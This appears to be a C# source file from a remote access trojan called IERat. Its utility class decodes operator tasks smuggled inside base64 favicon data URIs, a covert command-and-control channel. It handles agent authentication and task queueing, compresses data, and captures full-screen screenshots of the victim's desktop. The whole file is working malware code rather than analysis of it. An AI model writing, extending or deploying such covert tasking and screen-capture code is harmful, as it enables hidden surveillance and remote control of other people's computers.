using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace IERat.lib
{
    public class Utils
    {
        public static void ParseTask(string favicon)
        {
            try
            {
                favicon = favicon.Split(new string[] { "data:image/x-icon;base64," }, StringSplitOptions.None)[1];
                string ResponseObjectJSON = Base64Decode(favicon);
                JavaScriptSerializer js = new JavaScriptSerializer();
                ResponseObject responseObject =  js.Deserialize<ResponseObject>(ResponseObjectJSON);
                if (responseObject.Type == "NewAgent") { 
                    if (responseObject.Notes == "Authenticated")
                    {
                        //Console.WriteLine("Authenticated Successfully");
                        IERat.channel.Status = "Connected";
                    } 
                }

                else if ((responseObject.Type == "NewTask") && (responseObject.Task != null))
                {
                    IERat.channel.agent.AgentTasks.Enqueue(responseObject.Task);
                }
            }
            catch
            {
                Console.WriteLine("parsing failed");
            }
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static byte[] Compress(byte[] data)
        {
            using (var compressedStream = new MemoryStream())
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
            {
                zipStream.Write(data, 0, data.Length);
                zipStream.Close();
                return compressedStream.ToArray();
            }
        }

        public static byte[] CollectScreenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            var imgStream = new MemoryStream();
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    bitmap.Save(imgStream, ImageFormat.Jpeg);
                }
            }
            return imgStream.ToArray();
        }
    }

    public class ResponseObject
    {
        public ResponseObject()
        {
            Type = "NewTask"; // FilePart, NewAgent
            Task = new TaskObject();
        }
        public string Type { get; set; }
        public Guid AgentID { get; set; }
        public TaskObject Task { get; set; }
        public string Notes { get; set; }

    }
    public class RequestObject
    {
        public RequestObject(Guid ID)
        {
            AgentID = ID;
            CompletedTasks = new List<TaskObject>();
        }
        public Guid AgentID { get; set; }
        public List<TaskObject> CompletedTasks { get; set; }
        public string ToJSON()
        {
            JavaScriptSerializer js = new JavaScriptSerializer();
            return js.Serialize(this);
        }
    }
}
